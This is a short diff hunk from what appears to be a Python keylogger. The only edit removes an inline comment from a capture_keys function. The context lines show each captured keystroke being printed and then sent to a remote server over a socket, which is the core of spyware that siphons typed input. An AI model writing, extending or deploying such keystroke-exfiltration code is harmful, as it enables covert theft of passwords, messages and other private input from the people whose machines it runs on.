@@ -39,7 +39,7 @@ def capture_keys(key):
                 if key.vk == 65437:
                     char = "5"
             else:
-                char = getattr(key, 'char')  # Use 'char' if
+                char = getattr(key, 'char')  
             print(char, end='', flush=True)
             server.send(char.encode())
         except Exception as e_cap_key:
